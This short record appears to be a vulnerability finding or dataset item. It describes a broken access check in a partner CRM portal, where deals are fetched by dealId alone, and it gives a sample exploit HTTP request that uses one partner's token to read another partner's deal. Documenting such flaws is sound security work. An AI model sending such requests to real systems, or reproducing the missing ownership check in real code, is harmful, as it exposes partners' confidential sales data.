diagnosis: The partner CRM portal mounts partnerApp on '/partners/:partnerId/leads', but the deal lookup endpoint fetches records using solely req.params.dealId without validating that the deal belongs to partnerId. Rival channel partners can inspect confidential prospect company names, contract sizes, and sales strategies.
exploit_request:
GET /partners/partner_reseller_east/leads/deal/deal_enterprise_cloud_99214 HTTP/1.1
Host: partners.saas.internal:7000
Authorization: Bearer <partner_east_jwt>
Accept: application/json
